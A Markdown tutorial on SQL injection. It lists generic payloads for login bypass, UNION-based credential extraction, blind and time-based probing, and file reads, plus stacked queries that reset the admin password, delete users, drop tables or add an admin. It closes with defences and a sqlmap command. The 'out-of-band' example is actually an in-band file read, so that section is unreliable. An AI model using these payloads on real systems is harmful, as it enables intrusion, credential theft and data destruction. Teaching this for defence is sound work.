# SQL Injection Guide

## **1. What is SQL Injection?**
SQL Injection (SQLi) is a web security vulnerability that allows attackers to manipulate SQL queries by injecting malicious SQL code. This can lead to unauthorized access, data leaks, or even full database control.

---
## **2. Types of SQL Injection Attacks**

### **2.1. Classic SQL Injection (Error-Based SQLi)**
Attackers inject SQL code to extract database errors that reveal information about the structure of the database.

**Example:**
```sql
' OR 1=1 -- 
```
**Effect:** Logs in as the first user in the database.

---

### **2.2. Union-Based SQL Injection**
Attackers use the `UNION` statement to combine malicious queries with legitimate ones.

**Example:**
```sql
' UNION SELECT null, username, password FROM users -- 
```
**Effect:** Extracts usernames and passwords from the `users` table.

---

### **2.3. Boolean-Based Blind SQL Injection**
Attacks based on yes/no responses when an application does not return error messages.

**Example:**
```sql
' AND (SELECT database())='testdb' -- 
```
**Effect:** If `testdb` is the current database, login succeeds.

---

### **2.4. Time-Based Blind SQL Injection**
Uses time delays to infer query execution success.

**Example:**
```sql
' AND IF(1=1, SLEEP(5), 0) -- 
```
**Effect:** Delays execution by 5 seconds if the condition is true.

---

### **2.5. Out-of-Band SQL Injection**
Uses external systems (e.g., DNS, HTTP) to extract data.

**Example:**
```sql
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3 -- 
```
**Effect:** Reads server files (if allowed).

---
## **3. SQL Injection for Database Manipulation**

### **3.1. Changing Passwords**
```sql
' ; UPDATE users SET password='hacked' WHERE username='admin' -- 
```
**Effect:** Changes the admin password.

---

### **3.2. Deleting All Users**
```sql
' ; DELETE FROM users -- 
```
**Effect:** Deletes all users.

---

### **3.3. Dropping a Table**
```sql
' ; DROP TABLE users -- 
```
**Effect:** Deletes the `users` table.

---

### **3.4. Creating a New Admin User**
```sql
' ; INSERT INTO users (username, password, is_admin) VALUES ('hacker', 'password', 1) -- 
```
**Effect:** Creates a new admin account.

---
## **4. How to Protect Against SQL Injection**
**Use Prepared Statements (Parameterized Queries):**
```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

**Use ORM (e.g., SQLAlchemy)** to interact with databases instead of raw SQL.

**Sanitize User Input:** Enforce strict validation rules for input fields.

**Use Web Application Firewalls (WAFs):** Block malicious queries before they reach the database.

---

## **5. Tools for SQL Injection Testing**
🔹 **sqlmap** – Automates SQL Injection testing
```bash
sqlmap -u "http://example.com/login" --dbs
```
🔹 **Wireshark** – Captures SQL traffic for analysis
🔹 **Burp Suite** – Intercepts and manipulates SQL queries

---
## **Conclusion**
SQL Injection remains one of the most critical security vulnerabilities. Understanding and testing these techniques help developers secure their applications effectively.
